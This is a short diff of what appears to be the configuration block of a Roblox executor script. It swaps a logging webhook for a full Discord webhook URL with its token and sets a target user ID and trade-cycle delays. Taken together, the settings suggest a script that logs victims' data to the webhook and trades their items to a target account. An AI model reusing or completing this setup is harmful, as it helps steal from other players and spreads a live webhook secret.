@@ -1,4 +1,4 @@
-getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_4d0ae60ed9b14a14b4be93b354b80c8b"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1478931309207224404/XLk0PtTOFgLwnA7O3XjNyfHTIJRoyBnnbzsLRHs3vxXlQX7k3CfuLGk1g-mJpZfpuu4K"
 getgenv().TARGET_ID = 9108584179
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2 
